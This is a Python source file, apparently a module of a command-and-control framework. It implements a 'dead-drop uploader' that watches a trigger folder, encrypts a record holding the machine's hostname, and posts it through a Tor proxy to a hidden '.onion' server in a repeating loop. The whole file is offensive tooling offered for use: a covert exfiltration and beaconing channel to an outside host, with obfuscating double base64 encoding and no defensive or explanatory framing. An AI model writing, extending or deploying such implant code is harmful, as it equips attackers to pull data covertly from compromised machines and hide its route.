#!/usr/bin/env python3
# File: modules/c2/signal_aware_dead_drop_uploader.py

import os
import time
import json
import base64
import random
import socket
import requests
from datetime import datetime
from pathlib import Path
from Crypto.Cipher import AES
from Crypto.Hash import HMAC, SHA256
from Crypto.Random import get_random_bytes

# Config
TRIGGER_DIR = "dropzone/triggers"
PAYLOAD_DIR = "dropzone/payloads"
UPLOAD_URL = "http://dead-drop-server.onion/api/upload"
TOR_PROXY = "socks5h://127.0.0.1:9050"
KEY_FILE = "secrets/dead_drop.key"
DASHBOARD_ALERT = "webgui/alerts.json"
RETRY_INTERVAL = 30

Path(TRIGGER_DIR).mkdir(parents=True, exist_ok=True)
Path(PAYLOAD_DIR).mkdir(parents=True, exist_ok=True)
Path(DASHBOARD_ALERT).parent.mkdir(parents=True, exist_ok=True)

def log(msg):
    print(f"[{datetime.utcnow()}] {msg}")

def load_key():
    if not os.path.exists(KEY_FILE):
        key = get_random_bytes(32)
        with open(KEY_FILE, "wb") as f:
            f.write(key)
    else:
        with open(KEY_FILE, "rb") as f:
            key = f.read()
    return key

def encrypt_payload(data, key):
    iv = get_random_bytes(16)
    cipher = AES.new(key, AES.MODE_CBC, iv)
    padded_data = data.encode().ljust((len(data) + 15) // 16 * 16, b"\x00")
    ciphertext = cipher.encrypt(padded_data)
    hmac = HMAC.new(key, ciphertext, digestmod=SHA256).digest()
    full_payload = iv + hmac + ciphertext
    return base64.b64encode(base64.b64encode(full_payload)).decode()

def generate_payload():
    content = {
        "agent": socket.gethostname(),
        "timestamp": datetime.utcnow().isoformat(),
        "payload": base64.b64encode(os.urandom(64)).decode()
    }
    return json.dumps(content)

def detect_trigger():
    files = os.listdir(TRIGGER_DIR)
    return any(f.endswith(".tag") for f in files)

def send_via_tor(data):
    try:
        import socks
        import urllib3
        from urllib3.contrib.socks import SOCKSProxyManager

        http = SOCKSProxyManager(
            proxy_url=TOR_PROXY,
            num_pools=1,
            timeout=5.0
        )
        r = http.request(
            "POST",
            UPLOAD_URL,
            headers={"Content-Type": "application/json"},
            body=json.dumps({"upload": data})
        )
        log(f"[+] Upload via Tor complete: {r.status}")
        return r.status == 200
    except Exception as e:
        log(f"[!] Tor upload failed: {e}")
        return False

def alert_dashboard():
    alert = {
        "timestamp": datetime.utcnow().isoformat(),
        "type": "signal_triggered_upload",
        "agent": socket.gethostname(),
        "channel": "RF-tag+Tor"
    }
    try:
        if os.path.exists(DASHBOARD_ALERT):
            with open(DASHBOARD_ALERT, "r") as f:
                alerts = json.load(f)
        else:
            alerts = []
        alerts.append(alert)
        with open(DASHBOARD_ALERT, "w") as f:
            json.dump(alerts, f, indent=2)
    except Exception as e:
        log(f"[!] Alert dashboard write failed: {e}")

def run_loop():
    key = load_key()
    while True:
        if detect_trigger():
            log("[*] Signal pattern detected. Preparing payload.")
            payload_data = generate_payload()
            encrypted = encrypt_payload(payload_data, key)
            with open(f"{PAYLOAD_DIR}/dead_drop_{int(time.time())}.enc", "w") as f:
                f.write(encrypted)
            if send_via_tor(encrypted):
                alert_dashboard()
        time.sleep(RETRY_INTERVAL)

if __name__ == "__main__":
    log("[*] Signal-aware Dead-Drop Uploader started.")
    run_loop()
